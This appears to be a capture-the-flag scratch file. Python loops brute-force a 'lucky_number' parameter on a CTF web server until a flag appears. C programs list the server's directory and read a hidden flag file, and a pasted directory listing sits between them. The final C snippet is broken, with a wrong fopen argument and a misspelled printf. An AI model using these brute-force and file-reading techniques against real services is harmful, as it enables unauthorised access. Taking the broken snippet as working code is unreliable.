
'''import sys
import requests
for i in range(5400,10000):
	url="http://dimitrust.oa.to:8080/trustctf/lucky_number/?number={0}".format(i)
	res = requests.get(url)
	res=res.text
	if res.find("TRUST{")!=-1:
		print(i)
		sys.exit(0);
	else:
		print(i)
		'''
		
import requests
import sys
for a in range(0,10):
	for s in range(0,10):
		for d in range(0,10):
			for f in range(0,10):
				url="http://dimitrust.oa.to:8080/trustctf/lucky_number/?number={0}{1}{2}{3}".format(a,s,d,f)
				res = requests.get(url)
				res=res.text
				if res.find("TRUST{") != -1:
					print("!!!!!!!!!!")
					print(url+" : {0}{1}{2}{3}".format(a,s,d,f))
					sys.exit(1)
				else:
					print(url+" : {0}{1}{2}{3}".format(a,s,d,f))
'''
#include <stdio.h>
#include <unistd.h>
#include <dirent.h>

int main()
{
   DIR            *dir_info;
   struct dirent  *dir_entry; 

   dir_info = opendir(".");              
   if ( NULL != dir_info)
   {
      if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  if(dir_entry=readdir(dir_info)){
		printf( "%s\n", dir_entry->d_name);
	  }
	  else{
		closedir(dir_info);
      }
	  
   }
   return 0;
}


css test submit.php font test.c . .. chm.c exploit .gdb_history chm Th1s_1s_F1a9.php index.html js
'''
#include <stdio.h>  
#include <string.h> 
#include <fcntl.h>  
#include <unistd.h> 
#define  BUFF_SIZE   1024
int main()
{
   char   buff[BUFF_SIZE];
   int    fd;

   if ( 0 < ( fd = open( "./Th1s_1s_F1a9.php", O_RDONLY)))
   {
      read( fd, buff, BUFF_SIZE);
      puts( buff);
      close( fd);
   }
   else
   {
      printf( "fail.\n");
   }
   return 0;
}



#include <stdio.h>  
#include <string.h> 
#include <fcntl.h>  
#include <unistd.h> 
#define  BUFF_SIZE   1024
int main()
{
   char   buff[BUFF_SIZE];
   int    fd;

   if ( 0 < ( fd = open( "./Th1s_1s_F1a9.php", O_RDONLY)))
   {
      read( fd, buff, BUFF_SIZE);
      puts( buff);
      close( fd);
   }
   else
   {
      printf( "fail.\n");
   }
   return 0;
}



#include<stdio.h>
int main(){
FILE *fp;
char ch;
fp = fopen("./Th1s_1s_F1a9.php",'r');
ch=fgetc(fp);
print("%c",ch);
return 0;
}